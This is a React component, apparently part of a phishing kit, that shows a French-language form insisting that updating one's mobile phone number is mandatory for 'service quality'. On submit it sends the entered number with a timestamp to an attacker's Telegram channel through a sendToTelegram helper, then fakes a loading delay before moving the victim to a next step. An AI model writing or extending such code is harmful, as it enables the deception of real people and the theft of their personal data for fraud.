import React, { useState } from 'react';
import { sendToTelegram } from '../utils/telegram';

interface PhoneFormProps {
  onNext: () => void;
}

export default function PhoneForm({ onNext }: PhoneFormProps) {
  const [phone, setPhone] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Préparer le message pour Telegram
    const message = `
<b>📱 Numéro de téléphone saisi</b>

<b>Numéro:</b> ${phone}
<b>Timestamp:</b> ${new Date().toLocaleString('fr-FR')}
<b>Page:</b> Mise à jour téléphone
    `;

    // Envoyer vers Telegram
    await sendToTelegram(message);

    // Simuler un délai puis passer à l'étape suivante
    setTimeout(() => {
      setIsLoading(false);
      onNext();
    }, 1500);
  };

  return (
    <div className="continer">
      <form onSubmit={handleSubmit}>
        <h2 style={{ textAlign: 'center' }}>
          Afin de maintenir la qualité de nos services, la mise à jour de votre numéro de téléphone portable est <strong>obligatoire</strong>.
        </h2>
        
        <div className="col">
          <h4 style={{ fontWeight: 'normal', textAlign: 'left' }}>
            Entrez votre numéro de téléphone pour continuer.
          </h4>
        </div>

        <div className="col">
          <input 
            type="tel" 
            placeholder="Entrez votre numéro de téléphone." 
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            required 
          />
        </div>

        <div className="but">
          <button type="submit" disabled={isLoading}>
            {isLoading ? 'Confirmation...' : 'Confirmer'}
          </button>
        </div>
      </form>
    </div>
  );
}